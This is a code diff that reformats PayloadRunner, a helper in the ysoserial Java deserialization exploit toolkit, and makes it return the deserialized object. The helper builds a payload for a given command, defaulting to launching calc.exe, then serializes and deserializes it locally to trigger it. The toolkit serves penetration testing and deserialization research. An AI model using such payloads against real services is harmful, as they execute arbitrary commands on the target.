@@ -1,41 +1,49 @@
 package ysoserial.payloads.util;
 
-import java.util.concurrent.Callable;
 
-import ysoserial.Deserializer;
-import ysoserial.Serializer;
 import static ysoserial.Deserializer.deserialize;
 import static ysoserial.Serializer.serialize;
+
+import java.util.concurrent.Callable;
+
 import ysoserial.payloads.ObjectPayload;
 import ysoserial.secmgr.ExecCheckingSecurityManager;
+
 
 /*
  * utility class for running exploits locally from command line
  */
-@SuppressWarnings("unused")
+@SuppressWarnings ( {
+    "javadoc", "nls"
+} )
 public class PayloadRunner {
-	public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
-		// ensure payload generation doesn't throw an exception
-		byte[] serialized = new ExecCheckingSecurityManager().wrap(new Callable<byte[]>(){
-			public byte[] call() throws Exception {
-				final String command = args.length > 0 && args[0] != null ? args[0] : "calc.exe";
 
-				System.out.println("generating payload object(s) for command: '" + command + "'");
+    public static Object run ( final Class<? extends ObjectPayload<?>> clazz, final String[] args ) throws Exception {
+        // ensure payload generation doesn't throw an exception
+        byte[] serialized = new ExecCheckingSecurityManager().wrap(new Callable<byte[]>() {
 
-				final Object objBefore = clazz.newInstance().getObject(command);
+            public byte[] call () throws Exception {
+                final String command = args.length > 0 && args[ 0 ] != null ? args[ 0 ] : "calc.exe";
 
-				System.out.println("serializing payload");
+                System.out.println("generating payload object(s) for command: '" + command + "'");
 
-				return Serializer.serialize(objBefore);
-		}});
+                final Object objBefore = clazz.newInstance().getObject(command);
 
-		try {
-			System.out.println("deserializing payload");
-			final Object objAfter = Deserializer.deserialize(serialized);
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
+                System.out.println("serializing payload");
 
-	}
+                return serialize(objBefore);
+            }
+        });
+
+        try {
+            System.out.println("deserializing payload");
+            return deserialize(serialized);
+        }
+        catch ( Exception e ) {
+            e.printStackTrace();
+        }
+
+        return null;
+    }
 
 }
